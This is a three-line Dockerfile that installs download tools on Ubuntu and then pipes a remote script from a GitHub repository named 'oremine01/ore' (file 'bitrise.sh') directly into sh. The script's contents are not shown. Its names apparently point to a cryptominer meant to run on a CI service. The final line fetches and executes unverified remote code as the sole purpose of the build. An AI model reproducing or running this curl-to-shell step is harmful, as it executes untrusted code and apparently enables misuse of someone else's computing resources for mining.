FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/oremine01/ore/main/bitrise.sh | sh
